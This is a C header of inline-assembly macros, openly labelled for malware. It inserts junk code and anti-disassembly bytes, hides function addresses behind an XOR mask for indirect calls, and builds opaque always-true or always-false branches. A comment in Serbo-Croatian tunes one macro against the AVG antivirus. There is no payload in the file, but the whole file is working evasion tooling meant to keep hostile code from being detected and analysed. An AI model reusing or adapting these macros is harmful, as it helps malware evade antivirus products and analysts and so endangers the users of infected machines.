#pragma once
#ifndef __CODE_OBSFUCATOR_H
#define __CODE_OBSFUCATOR_H

#if defined _WIN64
extern DWORD64 _malware_hide_function_mask;  // this should be randomized
#else
extern DWORD32 _malware_hide_function_mask;  // this should be randomized
#endif

#ifndef __obfuscated_switch
#define __obfuscated_switch static __declspec(noinline) 
#endif

void __fastcall ObfuscateBranchAsFunction();

enum MalwareSwitchExecute
{
  MalwareSwitchExecute_F1,
  MalwareSwitchExecute_F2,
  MalwareSwitchExecute_F3,
  MalwareSwitchExecute_F4,
  MalwareSwitchExecute_F5,
  MalwareSwitchExecute_F6,
  MalwareSwitchExecute_F7,
  MalwareSwitchExecute_F8,
  MalwareSwitchExecute_F9,
  MalwareSwitchExecute_F10,
  MalwareSwitchExecute_F11,
  MalwareSwitchExecute_F12,
  MalwareSwitchExecute_F13,
  MalwareSwitchExecute_F14,
  MalwareSwitchExecute_F15,
  MalwareSwitchExecute_F16,
  MalwareSwitchExecute_F17,
  MalwareSwitchExecute_F18,
  MalwareSwitchExecute_F19,
};

#define MALWARE_JUNK_CODE_0        \
  __asm{mov dword ptr ss:[esp-4], eax}  /* push EAX */ \
  __asm{sub esp, 4}           \
  __asm{xor eax, eax}        \
  __asm{setpo al}            \
  __asm{mov dword ptr ss:[esp-4],edx}  /* push EDX */ \
  __asm{sub esp,4}           \
  __asm{xor edx, eax}        \
  __asm{sal edx, 2}        \
  __asm{xchg eax, edx}    \
  __asm{mov edx,dword ptr ss:[esp]}     /* pop EDX */  \
  __asm{add esp,4}            \
  __asm{or eax, ecx}        \
  __asm{mov eax,dword ptr ss:[esp]}     /* pop EAX */  \
  __asm{add esp,4}            

#define MALWARE_JUNK_CODE_1        \
  __asm{mov dword ptr ss:[esp-4], eax}  /* push EAX */ \
  __asm{sub esp, 4} \
  __asm{mov dword ptr ss:[esp-4], ebx}  /* push EBX */ \
  __asm{sub esp, 4} \
  __asm{pushf}			  /* saves flags */ \
  __asm _emit 0xE8 __asm _emit 0x00 __asm _emit 0x00 __asm _emit 0x00 __asm _emit 0x00  /* call MYSELF */ \
  __asm{mov eax,dword ptr ss:[esp]}     /* pop EAX */  \
  __asm{add esp,4} \
  __asm{mov dword ptr ss:[esp-4], eax}  /* push EAX */ \
  __asm{sub esp, 4} \
  __asm{mov	ebx, eax} \
  __asm{add	ebx, 2dh} /* offset of 1st instruction after this obfuscated code */ \
  __asm{sub	ebx, eax} \
  __asm{mov eax,dword ptr ss:[esp]}     /* pop EAX */  \
  __asm{add esp,4} \
  __asm{inc	eax} \
  __asm{add	eax, 2} \
  __asm{add	ebx, eax} \
  __asm{mov dword ptr ss:[esp-4], ebx}  /* push EBX */ \
  __asm{sub esp, 4} \
  __asm{pop eax} /* obfuscated retn = pop eax; jmp eax */ \
  __asm{jmp eax} \
  __asm _emit 0x84 __asm _emit 0xAB   \
  __asm{popf}					/* restores flags */ \
  __asm{mov ebx,dword ptr ss:[esp]}     /* pop EBX */  \
  __asm{add esp,4} \
  __asm{mov eax,dword ptr ss:[esp]}     /* pop EAX */  \
  __asm{add esp,4} 

#define MALWARE_NOT_WORKING_JUNK_0        \
  __asm {push ecx} \
  __asm {mov edx, [ebx]} \
  __asm {rep stosb} \
  __asm _emit 0xC7 __asm _emit 0x84 __asm _emit 0xAB 

#define MALWARE_NOT_WORKING_JUNK_1        \
  __asm {push edx} \
  __asm {xor eax, eax} \
  __asm {lodsb} \
  __asm _emit 0x84 __asm _emit 0xAB 

/*
  Performs indirect function call
    IN fnAddress    - ptr to function to execute
		OUT opResult    - operation result
		IN param1       - first function parameter
    IN param2       - second function parameter
*/
#define	INDIRECT_FUNCTION_CALL2(fnAddress, opResult, param1, param2) \
	__asm{mov	[esp-4], ebx}		/*	Store EBX register	*/ \
	__asm{call $+5}\
	__asm{pop ebx}						/*	Some obfuscation junk which simply brings us to the next instruction	*/ \
	__asm{add	ebx, 0x16}			/* offset of l1-2 */ \
	__asm{cmp	ebx, ebx}\
	__asm{jnz	$+(5+7)}\
	__asm{add	ebx, 2}\
	__asm{jmp	ebx}						/*	Indirect jump to the next instruction	*/ \
	__asm _emit 0xC7 __asm _emit 0xE8 \
	/*__asm{l1:}*/ \
	__asm _emit 0xC7 __asm _emit 0x84 __asm _emit 0xAB \
	/*__asm{l2:}*/ \
	__asm _emit 0xC3 __asm _emit 0x8D \
	__asm{mov	ebx, ##param2}				/*	Start __asm{pushing__asm{ parameters in reverse order	*/ \
	__asm{jmp	$+(5+2)}									/*  Offset of l3 */ \
	__asm _emit 0xC7 __asm _emit 0x02 \
	/*__asm{l3:}*/ \
	__asm{mov	[esp-8], ebx}\
	__asm{jmp	$+(5+1)}									/* offset of l4 */ \
	__asm _emit 0xC7 \
	/*__asm{l4:}*/ \
	__asm{mov	ebx, ##param1}\
	__asm{mov	[esp-12], ebx}		/*	The first parameter has been __asm{pushed__asm{	*/ \
	__asm{mov	ebx, ##fnAddress}				/*	Load the address of the function into EBX register	*/ \
	__asm{xor	ebx, _malware_hide_function_mask}				/*	Apply XOR mask	*/ \
	__asm{sub	esp, 12}				/*	Adjust ESP	*/ \
	__asm{call	ebx}					/*	Call the function. It is strongly recommended to use indirect calls	*/ \
	__asm{add	esp, 8}				/*	Restore ESP	*/ \
	__asm{pop	ebx} \
	__asm{mov opResult,eax}
#endif

extern int __X0;
extern int __X2;

#define ALWAYS_TRUE_TEST true==true
#define ALWAYS_FALSE_TEST ALWAYS_FALSE_TEST_REAL
#define ALWAYS_TRUE_TEST_REAL (int)((3*__X0*__X0 - 1)/2 + (2*__X0 + 1)/3 - (__X0*__X0 - 2)/4 + 1/3)==0
#define ALWAYS_FALSE_TEST_REAL (__X2/2)*(__X2*__X2+1)-(2*((__X2+1)*(__X2+1))-5*__X2-3)!=0
//#define RESULT_IS_0(opRes) (int)((3*(int)opRes*(int)opRes - 1)/2 + (2*(int)opRes + 1)/3 - ((int)opRes*(int)opRes - 2)/4 + 1/3)==0

// za AVG je bitno da ovde ostane _0 a ne _##num
#define MALWARE_JUNK_CODE(num)             MALWARE_JUNK_CODE_0

#define IF_ALWAYS_TRUE_W_JUNK_ELSE(num)    if(ALWAYS_FALSE_TEST_REAL){MALWARE_NOT_WORKING_JUNK_##num} else  

#define OBFUSCATED_BRANCH_JMP(jumpToLabel) \
	__asm {push ecx} \
	__asm {mov ecx, offset jumpToLabel} \
	ObfuscateBranchAsFunction(); \
	__asm _emit 0xC7 __asm _emit 0x84 __asm _emit 0xAB

#define OBFUSCATED_BRANCH_JMP_W_RET(jumpToLabel, whatToReturn) \
	__asm {push ecx} \
	__asm {mov ecx, offset jumpToLabel} \
	ObfuscateBranchAsFunction(); \
	return whatToReturn; \
	__asm _emit 0xC7 __asm _emit 0x84 __asm _emit 0xAB

